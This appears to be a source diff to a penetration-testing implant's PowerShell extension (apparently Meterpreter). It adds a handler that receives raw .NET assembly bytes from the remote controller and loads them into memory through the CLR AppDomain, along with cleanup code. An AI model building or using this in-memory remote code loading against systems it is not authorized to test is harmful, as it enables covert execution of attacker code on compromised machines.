@@ -39,6 +39,66 @@ static IUnknownPtr gClrAppDomain = NULL;
 static _AppDomainPtr gClrAppDomainInterface = NULL;
 static _AssemblyPtr gClrPowershellAssembly = NULL;
 static _TypePtr gClrPowershellType = NULL;
+static LIST* gLoadedAssemblies = NULL;
+
+DWORD load_assembly(BYTE* assemblyData, DWORD assemblySize)
+{
+	dprintf("[PSH] loading assembly of size %u", assemblySize);
+	HRESULT hr = S_OK;
+	SAFEARRAY* clrByteArray = NULL;
+	SAFEARRAYBOUND bounds[1];
+	_AssemblyPtr* loadedAssembly = new _AssemblyPtr();
+
+	bounds[0].cElements = assemblySize;
+	bounds[0].lLbound = 0;
+
+	if (gClrAppDomainInterface == NULL)
+	{
+		dprintf("[PSH] Extension wasn't initialised");
+		return ERROR_INVALID_HANDLE;
+	}
+
+	do
+	{
+		clrByteArray = SafeArrayCreate(VT_UI1, 1, bounds);
+		if (clrByteArray == NULL)
+		{
+			dprintf("[PSH] Failed to create a usable safe array");
+			hr = (HRESULT)ERROR_OUTOFMEMORY;
+			break;
+		}
+
+		dprintf("[PSH] Safe array created");
+		if (FAILED(hr = SafeArrayLock(clrByteArray)))
+		{
+			dprintf("[PSH] Safe array lock failed 0x%x", hr);
+			break;
+		}
+
+		dprintf("[PSH] Copying binary data to target");
+		memcpy(clrByteArray->pvData, assemblyData, assemblySize);
+		SafeArrayUnlock(clrByteArray);
+
+		if (FAILED(hr = gClrAppDomainInterface->Load_3(clrByteArray, (_Assembly**)loadedAssembly)))
+		{
+			dprintf("[PSH] Failed to load the assembly 0x%x", hr);
+			break;
+		}
+
+		dprintf("[PSH] Assembly appears to have been loaded successfully");
+		list_add(gLoadedAssemblies, loadedAssembly);
+	} while (0);
+
+	if (SUCCEEDED(hr))
+	{
+		return ERROR_SUCCESS;
+	}
+	else
+	{
+		delete loadedAssembly;
+	}
+	return (DWORD)hr;
+}
 
 DWORD remove_session(wchar_t* sessionId)
 {
@@ -295,6 +355,7 @@ DWORD initialize_dotnet_host()
 			break;
 		}
 
+		gLoadedAssemblies = list_create();
 		dprintf("[PSH] Runtime has been initialized successfully");
 
 	} while(0);
@@ -331,10 +392,24 @@ DWORD initialize_dotnet_host()
 	return ERROR_SUCCESS;
 }
 
+BOOL destroy_loaded_assembly(LPVOID state, LPVOID data)
+{
+	if (data != NULL)
+	{
+		((_AssemblyPtr*)data)->Release();
+	}
+	return TRUE;
+}
+
 VOID deinitialize_dotnet_host()
 {
 	dprintf("[PSH] Cleaning up the .NET/PSH runtime.");
+
 	SAFE_RELEASE(gClrPowershellType);
+
+	list_enumerate(gLoadedAssemblies, destroy_loaded_assembly, NULL);
+	list_destroy(gLoadedAssemblies);
+
 	SAFE_RELEASE(gClrPowershellAssembly);
 	SAFE_RELEASE(gClrAppDomainInterface);
 	SAFE_RELEASE(gClrCorRuntimeHost);
@@ -526,6 +601,39 @@ DWORD request_powershell_execute(Remote *remote, Packet *packet)
 		else
 		{
 			dprintf("[PSH] Code parameter missing from call");
+			dwResult = ERROR_INVALID_PARAMETER;
+		}
+		packet_transmit_response(dwResult, remote, response);
+	}
+
+	SAFE_FREE(sessionId);
+
+	return dwResult;
+}
+
+/*!
+ * @brief Handle the request for .NET assembly importing/loading.
+ * @param remote Pointer to the \c Remote making the request.
+ * @param packet Pointer to the request \c Packet.
+ * @returns Indication of success or failure.
+ */
+DWORD request_powershell_assembly_load(Remote *remote, Packet *packet)
+{
+	DWORD dwResult = ERROR_SUCCESS;
+	Packet* response = packet_create_response(packet);
+	wchar_t* sessionId = NULL;
+
+	if (response)
+	{
+		BYTE* binary = packet_get_tlv_value_raw(packet, TLV_TYPE_POWERSHELL_ASSEMBLY);
+		if (binary != NULL)
+		{
+			DWORD binarySize = packet_get_tlv_value_uint(packet, TLV_TYPE_POWERSHELL_ASSEMBLY_SIZE);
+			dwResult = load_assembly(binary, binarySize);
+		}
+		else
+		{
+			dprintf("[PSH] Assembly parameter missing from call");
 			dwResult = ERROR_INVALID_PARAMETER;
 		}
 		packet_transmit_response(dwResult, remote, response);
